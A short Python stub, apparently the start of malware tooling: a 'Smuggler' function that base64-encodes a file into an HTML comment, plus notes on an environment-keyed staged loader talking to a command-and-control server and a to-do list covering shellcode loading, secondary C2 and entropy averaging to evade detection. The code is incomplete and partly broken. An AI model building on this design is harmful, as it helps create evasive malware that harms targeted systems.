import base64

# Smuggler
def htmlify(file_path):
    with open(file_path, "rb" ) as f:
        encoded = base64.b64encode(f)

    html = (

    "<!DOCTYPE html"
    "<html>"
    "<body>" 
    f"<!-- insert {encoded} -->"
    "</body>" 
    "</html>"

    )
    
# Env Key Notes:
# Stager1 smuggles env key to high command
# High command encrypts Stager2 with given env key
# Stager1 recieves encrypted Stager2 and decrypts with env key
# Is this right?

""" 
TO DO :

things
- HTML smuggling
- Other C2 Comms
- Environment Keying and Encryption
- Shannon Entropy Averaging

overview
- Shellcode loader
- Secondary C2

"""